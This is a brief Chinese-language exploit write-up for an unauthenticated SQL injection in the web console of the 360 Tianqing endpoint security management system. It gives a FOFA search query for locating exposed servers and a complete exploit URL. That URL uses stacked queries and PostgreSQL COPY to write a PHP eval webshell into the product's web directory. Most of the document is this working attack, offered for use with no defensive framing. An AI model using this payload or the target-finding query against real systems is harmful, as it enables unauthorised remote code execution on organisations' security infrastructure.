## 0x00 漏洞背景

        360天擎是一套终端安全管理系统，有客户端和Web端，漏洞出现在Web端，可以未授权访问的API，该API存在SQL注入漏洞，可导致直接写入Webshell
        
        FOFA语句 app="360天擎终端安全管理系统"
        
## 0x01 漏洞利用

        /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
